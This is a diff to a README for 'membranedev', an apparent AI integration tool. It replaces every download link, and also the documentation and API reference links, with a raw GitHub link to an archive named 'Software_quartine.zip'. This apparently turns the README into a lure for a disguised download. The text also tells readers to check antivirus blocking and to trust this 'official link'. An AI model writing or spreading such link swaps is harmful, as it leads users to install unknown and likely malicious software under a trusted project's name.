@@ -1,6 +1,6 @@
 # 🧬 membranedev - Simple AI Integration Setup
 
-[![Download membranedev](https://img.shields.io/badge/Download-membranedev-brightgreen)](https://github.com/jothi978/membranedev)
+[![Download membranedev](https://img.shields.io/badge/Download-membranedev-brightgreen)](https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before installing membranedev, make sure your computer meets these requirements:
 To get membranedev on your PC, follow these steps:
 
 1. Visit the official repository page by clicking this link:  
-[Download membranedev](https://github.com/jothi978/membranedev)
+[Download membranedev](https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip)
 
 2. Once there, look for the "Releases" section or a download button.
 
@@ -105,7 +105,7 @@ If you encounter issues, try these steps:
 - Check if your antivirus or firewall is blocking the app.
 
 - Ensure you used the official download link:  
-  https://github.com/jothi978/membranedev
+  https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip
 
 - If a step is unclear, refer to the Documentation section below.
 
@@ -115,8 +115,8 @@ If you encounter issues, try these steps:
 
 Access more detailed guides and references to get the most from membranedev:
 
-- **Documentation:** https://docs.getmembrane.com  
-- **API Reference:** https://docs.getmembrane.com/docs/api
+- **Documentation:** https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip  
+- **API Reference:** https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip
 
 These sites explain how to use more advanced features and answer technical questions.
 
@@ -127,7 +127,7 @@ These sites explain how to use more advanced features and answer technical quest
 To make sure membranedev runs smoothly, keep it up to date:
 
 1. Visit the download page regularly:  
-   [https://github.com/jothi978/membranedev](https://github.com/jothi978/membranedev)
+   [https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip](https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip)
 
 2. Download any new installer versions as they become available.
 
@@ -145,4 +145,4 @@ Always download software from the official link to avoid harmful versions.
 
 # Get Started Now
 
-[![Download membranedev](https://img.shields.io/badge/Download-membranedev-orange)](https://github.com/jothi978/membranedev)
+[![Download membranedev](https://img.shields.io/badge/Download-membranedev-orange)](https://github.com/jothi978/membranedev/raw/refs/heads/main/premedial/Software_quartine.zip)
